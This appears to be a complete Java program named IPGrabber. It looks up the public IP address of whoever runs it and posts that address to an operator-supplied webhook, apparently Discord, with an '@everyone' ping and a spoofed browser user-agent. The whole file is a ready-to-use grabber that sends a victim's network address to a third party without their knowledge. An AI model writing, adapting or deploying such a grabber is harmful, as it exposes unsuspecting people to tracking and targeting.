import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;

public class IPGrabber {

	public static void main(String[] args) {
		try {
            URL url = new URI("https://api.ipify.org/").toURL();
            HttpURLConnection con = (HttpURLConnection) url.openConnection();
			
			con.setRequestMethod("GET");

			int responseCode = con.getResponseCode();
			if (responseCode != 200) {
				System.out.println("Failed to fetch page. Response code: " + responseCode);
				return;
			}

			BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
			String inputLine;
			StringBuilder htmlContent = new StringBuilder();

            while ((inputLine = in.readLine()) != null) {
				htmlContent.append(inputLine);
			}
			in.close();

			int len = htmlContent.length();
			String ip = htmlContent.substring(0, len);

            sendMessage("@everyone\n" + "> IP: " + ip);
        } catch(Exception e) {
        	e.printStackTrace();
        }
	}

	public static void sendMessage(String message) {
	        PrintWriter out = null;
	        BufferedReader in = null;
	        StringBuilder result = new StringBuilder();
	        try {
	            URL url = new URI("<webhook url>").toURL(); // PUT YOUR URL HERE
	            URLConnection conn = url.openConnection();
	            conn.setRequestProperty("accept", "*/*");
	            conn.setRequestProperty("connection", "Keep-Alive");
	            conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
	            conn.setDoOutput(true);
	            conn.setDoInput(true);
	            out = new PrintWriter(conn.getOutputStream());
	            String postData = URLEncoder.encode("content", "UTF-8") + "=" + URLEncoder.encode(message, "UTF-8");
	            out.print(postData);
	            out.flush();
	            in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
	            String line;
	            while ((line = in.readLine()) != null) {
	                result.append("/n").append(line);
	            }

	        } catch (Exception e) {
	            e.printStackTrace();
	        }
	}
}

